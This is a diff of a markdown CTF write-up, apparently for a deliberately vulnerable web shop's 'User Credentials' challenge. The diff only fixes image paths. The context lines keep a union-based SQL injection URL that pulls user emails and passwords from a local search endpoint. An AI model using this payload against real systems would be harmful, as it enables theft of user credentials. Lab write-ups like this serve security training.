@@ -1,6 +1,6 @@
 # User Credentials
 
-![image](../../../Assets/7-3.png)
+![image](../../Assets/7-3.png)
 
 ## Clue provided
 
@@ -28,7 +28,7 @@ with json body:
 }
 ```
 
-![image](../../../Assets/7-1.png)
+![image](../../Assets/7-1.png)
 
 ### Exploiting the vulnerability
 
@@ -38,10 +38,10 @@ We can use union-based SQL injection to extract the user credentials. The databa
 http://127.0.0.1:3000/rest/products/search?q=%27))%20UNION%20SELECT%201,email,password,4,5,6,7,8,9%20FROM%20users--
 ```
 
-![image](../../../Assets/7-2.png)
+![image](../../Assets/7-2.png)
 
 ### Result
 
-![image](../../../Assets/7-4.png)
+![image](../../Assets/7-4.png)
 
 
